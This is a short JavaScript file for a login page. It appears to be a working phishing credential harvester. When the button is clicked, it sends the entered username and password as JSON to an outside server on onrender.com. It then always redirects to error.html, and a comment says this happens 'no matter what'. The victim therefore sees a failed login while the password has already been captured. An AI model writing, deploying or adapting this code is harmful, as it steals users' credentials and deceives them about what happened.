document.addEventListener("DOMContentLoaded", function () {
    // Attach event listener to the login button
    const loginButton = document.getElementById("loginBtn");
    if (loginButton) {
        loginButton.addEventListener("click", login);
    }
});

async function login() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
        alert("Please enter both username and password.");
        return;
    }

    try {
        await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        // 🚨 Always redirect to error.html no matter what
        window.location.href = "error.html";
    } catch (error) {
        console.error("Error:", error);
        window.location.href = "error.html"; // Redirect on error as well
    }
}
